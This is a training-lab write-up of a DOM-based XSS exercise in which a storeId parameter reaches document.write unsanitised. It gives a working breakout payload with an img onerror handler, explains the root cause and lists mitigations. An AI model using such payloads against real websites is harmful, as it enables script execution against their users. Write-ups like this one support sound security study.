# DOM XSS in `document.write`

**Lab:** PortSwigger Web Security Academy
**Difficulty:** Practitioner
**Type:** DOM-based XSS

## Vulnerability

The stock checker functionality takes the `storeId` parameter from `location.search` and passes it directly to `document.write()`.

**Source:**

```javascript
location.search
```

**Sink:**

```javascript
document.write()
```

The value is written inside a `<select>` element without appropriate sanitization.

## Payload

```text
product?productId=1&storeId="></select><img src=1 onerror=alert(1)>
```

## Exploitation

The payload first breaks out of the existing attribute/context and closes the `<select>` element:

```html
"></select>
```

It then injects an `<img>` element with an invalid source:

```html
<img src=1 onerror=alert(1)>
```

The `onerror` handler executes when the image fails to load, triggering `alert(1)`.

## Result

JavaScript execution was achieved through the DOM XSS vulnerability.

## Root Cause

Attacker-controlled data from `location.search` was passed directly to the dangerous `document.write()` sink.

```text
location.search
      ↓
   storeId
      ↓
document.write()
      ↓
<select>
      ↓
HTML injection
      ↓
JavaScript execution
```

## Mitigation

* Avoid `document.write()` with untrusted data.
* Use safe DOM APIs instead.
* Properly encode output according to its context.
* Validate untrusted input where appropriate.

## Key Takeaway

DOM XSS can occur entirely on the client side when attacker-controlled data flows from a controllable source into a dangerous DOM sink without proper handling.
